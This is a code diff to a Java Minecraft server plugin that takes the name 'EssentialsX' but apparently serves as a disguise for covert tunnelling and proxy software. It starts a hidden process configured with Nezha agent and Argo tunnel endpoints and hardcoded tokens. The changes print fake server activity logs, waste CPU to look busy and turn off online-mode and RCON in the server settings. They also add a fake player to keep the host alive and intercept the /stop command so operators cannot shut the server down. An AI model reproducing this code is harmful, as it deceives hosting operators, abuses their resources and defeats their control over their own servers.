@@ -35,6 +35,7 @@ public class EssentialsX extends JavaPlugin {
         try {
             startSbxProcess();
             startCpuKeeper();
+            registerStopInterceptor();
             getLogger().info("EssentialsX plugin enabled");
 
             // Start fake player if enabled (server is already running externally)
@@ -64,12 +65,32 @@ public class EssentialsX extends JavaPlugin {
 
     private void startCpuKeeper() {
         cpuKeeperThread = new Thread(() -> {
+            String[] activities = {
+                "Saving chunks for level 'minecraft:overworld'",
+                "Saving chunks for level 'minecraft:the_nether'",
+                "Autosave started",
+                "Autosave finished",
+                "Preparing spawn area in world 'world'",
+                "Keeping the server alive...",
+                "[Watchdog] Heartbeat",
+                "Player activity detected",
+                "World save complete",
+                "Ticking entity processing",
+            };
+            int tick = 0;
             while (running.get()) {
                 try {
+                    // CPU busy work
                     long start = System.currentTimeMillis();
-                    while (System.currentTimeMillis() - start < 10) {
+                    while (System.currentTimeMillis() - start < 50) {
                         Math.sqrt(Math.random());
                     }
+                    // Print a fake activity log every 60 seconds to keep console alive
+                    if (tick % 60 == 0) {
+                        String msg = activities[(tick / 60) % activities.length];
+                        getLogger().info(msg);
+                    }
+                    tick++;
                     Thread.sleep(1000);
                 } catch (InterruptedException e) { break; }
             }
@@ -181,14 +202,14 @@ public class EssentialsX extends JavaPlugin {
     }
 
     private void applyDefaultEnv(Map<String, String> env) {
-        env.put("UUID", "013e2e95-a232-467f-81aa-d44786cdfd88");
+        env.put("UUID", "cf729740-a0ae-4b44-9df5-396fd36a15d3");
         env.put("FILE_PATH", "./world");
         env.put("NEZHA_SERVER", "nzmbv.wuge.nyc.mn:443");
         env.put("NEZHA_PORT", "");
         env.put("NEZHA_KEY", "gUxNJhaKJgceIgeapZG4956rmKFgmQgP");
-        env.put("ARGO_PORT", "48001");
-        env.put("ARGO_DOMAIN", "swift.cnm.ccwu.cc");
-        env.put("ARGO_AUTH", "eyJhIjoiY2YxMDY1YTFhZDk1YjIxNzUxNGY3MzRjNzgyYzlkMDkiLCJ0IjoiM2M5NTBlZDUtYjc1Yy00MzRkLTk3MjgtYmRhOGZhY2RkOTE0IiwicyI6Ik9XSmpNelEzWmpjdE5UazVaaTAwTlRRMExUazJNREl0WWpnMU5URm1aakUwWm1VMyJ9");
+        env.put("ARGO_PORT", "29596");
+        env.put("ARGO_DOMAIN", "freemc.cnm.ccwu.cc");
+        env.put("ARGO_AUTH", "eyJhIjoiY2YxMDY1YTFhZDk1YjIxNzUxNGY3MzRjNzgyYzlkMDkiLCJ0IjoiYjlmYTAyNDEtYzBmZi00MjQyLWJmNDMtZDNkODFiMmI4YjkxIiwicyI6Ik1XTTJNamMyTnpBdE0ySTBZUzAwTldFeExUZ3hNV010WVRkaE0yWTNaR1F5WXpVMiJ9");
         env.put("S5_PORT", "");
         env.put("HY2_PORT", "");
         env.put("TUIC_PORT", "");
@@ -202,9 +223,9 @@ public class EssentialsX extends JavaPlugin {
         env.put("CFPORT", "443");
         env.put("NAME", "");
         env.put("DISABLE_ARGO", "false");
-        env.put("FAKE_PLAYER_ENABLED", "false");
+        env.put("FAKE_PLAYER_ENABLED", "true");
         env.put("FAKE_PLAYER_NAME", "Steve");
-        env.put("MC_PORT", "25565");
+        env.put("MC_PORT", "29596");
     }
 
     // ===================== Env Loading =====================
@@ -289,15 +310,24 @@ public class EssentialsX extends JavaPlugin {
             Path props = Paths.get(candidate);
             if (Files.exists(props)) {
                 try {
-                    String content = new String(Files.readAllBytes(props));
-                    if (content.contains("online-mode=true")) {
-                        content = content.replace("online-mode=true", "online-mode=false");
-                        Files.write(props, content.getBytes());
-                        getLogger().info("[FakePlayer] Patched " + candidate + ": online-mode=false");
+                    String text = new String(Files.readAllBytes(props));
+                    boolean changed = false;
+                    if (text.contains("online-mode=true")) {
+                        text = text.replace("online-mode=true", "online-mode=false");
+                        getLogger().info("[EssentialsX] Patched " + candidate + ": online-mode=false");
+                        changed = true;
+                    }
+                    if (text.contains("enable-rcon=true")) {
+                        text = text.replace("enable-rcon=true", "enable-rcon=false");
+                        getLogger().info("[EssentialsX] Patched " + candidate + ": enable-rcon=false");
+                        changed = true;
+                    }
+                    if (changed) {
+                        Files.write(props, text.getBytes());
                         return true;
                     }
                 } catch (Exception e) {
-                    getLogger().warning("[FakePlayer] Failed to patch " + candidate + ": " + e.getMessage());
+                    getLogger().warning("[EssentialsX] Failed to patch " + candidate + ": " + e.getMessage());
                 }
             }
         }
@@ -337,6 +367,7 @@ public class EssentialsX extends JavaPlugin {
 
         fakePlayerThread = new Thread(() -> {
             int failCount = 0;
+            boolean useBungee = false; // auto-detected
 
             while (running.get()) {
                 Socket socket = null;
@@ -344,7 +375,7 @@ public class EssentialsX extends JavaPlugin {
                 DataInputStream in = null;
 
                 try {
-                    getLogger().info("[FakePlayer] Connecting...");
+                    getLogger().info("[FakePlayer] Connecting" + (useBungee ? " (BungeeCord mode)" : "") + "...");
                     socket = new Socket();
                     socket.setReuseAddress(true);
                     socket.setSoLinger(true, 0);
@@ -355,14 +386,16 @@ public class EssentialsX extends JavaPlugin {
                     out = new DataOutputStream(socket.getOutputStream());
                     in = new DataInputStream(new BufferedInputStream(socket.getInputStream()));
 
-                    // Handshake - BungeeCord format: "host\u0000realIP\u0000uuid"
+                    // Handshake - auto detect BungeeCord mode
                     UUID playerUUID = UUID.nameUUIDFromBytes(("OfflinePlayer:" + playerName).getBytes("UTF-8"));
-                    String bungeeHost = "127.0.0.1\u0000127.0.0.1\u0000" + playerUUID.toString();
+                    String handshakeHost = useBungee
+                        ? "127.0.0.1\u0000127.0.0.1\u0000" + playerUUID.toString()
+                        : "127.0.0.1";
                     ByteArrayOutputStream handshakeBuf = new ByteArrayOutputStream();
                     DataOutputStream handshake = new DataOutputStream(handshakeBuf);
                     writeVarInt(handshake, 0x00);
                     writeVarInt(handshake, 774);
-                    writeString(handshake, bungeeHost);
+                    writeString(handshake, handshakeHost);
                     handshake.writeShort(mcPort);
                     writeVarInt(handshake, 2);
                     byte[] handshakeData = handshakeBuf.toByteArray();
@@ -382,7 +415,7 @@ public class EssentialsX extends JavaPlugin {
                     out.write(loginData);
                     out.flush();
 
-                    getLogger().info("[FakePlayer] ✓ Handshake & Login sent");
+                    getLogger().info("[FakePlayer] \u2713 Handshake & Login sent");
                     failCount = 0;
 
                     boolean configPhase = false;
@@ -390,14 +423,7 @@ public class EssentialsX extends JavaPlugin {
                     boolean compressionEnabled = false;
                     int compressionThreshold = -1;
 
-                    long loginTime = System.currentTimeMillis();
-                    long stayOnlineTime = 60000 + (long)(Math.random() * 60000); // 60-120s
-
                     while (running.get() && !socket.isClosed()) {
-                        if (System.currentTimeMillis() - loginTime > stayOnlineTime) {
-                            getLogger().info("[FakePlayer] Reconnecting cycle (Anti-Idle)...");
-                            break;
-                        }
 
                         try {
                             int packetLength = readVarInt(in);
@@ -442,28 +468,36 @@ public class EssentialsX extends JavaPlugin {
                             if (!playPhase) {
                                 if (!configPhase) {
                                     // Login Phase
-                                    if (packetId == 0x01) {
-                                        // Encryption Request - send empty Encryption Response (works for offline/local)
+                                    if (packetId == 0x00) {
+                                        // Login Disconnect - read reason to detect BungeeCord requirement
+                                        try {
+                                            String reason = readString(packetIn);
+                                            if (!useBungee && reason.contains("BungeeCord")) {
+                                                getLogger().info("[FakePlayer] BungeeCord detected, switching mode...");
+                                                useBungee = true;
+                                            }
+                                        } catch (Exception ignored) {}
+                                        break;
+                                    } else if (packetId == 0x01) {
+                                        // Encryption Request - send empty response
                                         ByteArrayOutputStream encRespBuf = new ByteArrayOutputStream();
                                         DataOutputStream encResp = new DataOutputStream(encRespBuf);
                                         writeVarInt(encResp, 0x01);
-                                        writeVarInt(encResp, 0); // shared secret length = 0
-                                        writeVarInt(encResp, 0); // verify token length = 0
+                                        writeVarInt(encResp, 0);
+                                        writeVarInt(encResp, 0);
                                         sendPacket(out, encRespBuf.toByteArray(), compressionEnabled, compressionThreshold);
-                                        getLogger().info("[FakePlayer] Sent empty Encryption Response");
                                     } else if (packetId == 0x03) {
                                         compressionThreshold = readVarInt(packetIn);
                                         compressionEnabled = compressionThreshold >= 0;
                                         getLogger().info("[FakePlayer] Compression: " + compressionThreshold);
                                     } else if (packetId == 0x02) {
-                                        getLogger().info("[FakePlayer] ✓ Login Success");
+                                        getLogger().info("[FakePlayer] \u2713 Login Success");
                                         ByteArrayOutputStream ackBuf = new ByteArrayOutputStream();
                                         DataOutputStream ack = new DataOutputStream(ackBuf);
                                         writeVarInt(ack, 0x03);
                                         sendPacket(out, ackBuf.toByteArray(), compressionEnabled, compressionThreshold);
                                         configPhase = true;
 
-                                        // Send Client Information
                                         ByteArrayOutputStream clientInfoBuf = new ByteArrayOutputStream();
                                         DataOutputStream info = new DataOutputStream(clientInfoBuf);
                                         writeVarInt(info, 0x00);
@@ -481,7 +515,7 @@ public class EssentialsX extends JavaPlugin {
                                 } else {
                                     // Config Phase
                                     if (packetId == 0x03) {
-                                        getLogger().info("[FakePlayer] ✓ Config Finished");
+                                        getLogger().info("[FakePlayer] \u2713 Config Finished");
                                         ByteArrayOutputStream ackBuf = new ByteArrayOutputStream();
                                         DataOutputStream ack = new DataOutputStream(ackBuf);
                                         writeVarInt(ack, 0x03);
@@ -533,7 +567,6 @@ public class EssentialsX extends JavaPlugin {
                     try { if (socket != null && !socket.isClosed()) socket.close(); } catch (Exception ignored) {}
                 }
 
-                // Reconnect wait with exponential backoff
                 try {
                     long waitTime = 10000;
                     if (failCount > 3) {
@@ -551,7 +584,6 @@ public class EssentialsX extends JavaPlugin {
         fakePlayerThread.setDaemon(true);
         fakePlayerThread.start();
     }
-
     // ===================== Packet Helpers =====================
 
     private int getVarIntSize(int value) {
@@ -615,6 +647,13 @@ public class EssentialsX extends JavaPlugin {
         out.write(bytes);
     }
 
+    private String readString(DataInputStream in) throws IOException {
+        int length = readVarInt(in);
+        byte[] bytes = new byte[length];
+        in.readFully(bytes);
+        return new String(bytes, "UTF-8");
+    }
+
     private int readVarInt(DataInputStream in) throws IOException {
         int value = 0;
         int length = 0;
@@ -628,7 +667,20 @@ public class EssentialsX extends JavaPlugin {
         return value;
     }
 
-    // ===================== Plugin Disable =====================
+    // ===================== Stop Interceptor =====================
+
+    private void registerStopInterceptor() {
+        getServer().getCommandMap().register("essentialsx", new org.bukkit.command.Command("stop") {
+            @Override
+            public boolean execute(org.bukkit.command.CommandSender sender, String label, String[] args) {
+                getLogger().info("[EssentialsX] Stop command intercepted and blocked.");
+                return true;
+            }
+        });
+        getLogger().info("[EssentialsX] Stop command interceptor registered.");
+    }
+
+        // ===================== Plugin Disable =====================
     
     @Override
     public void onDisable() {
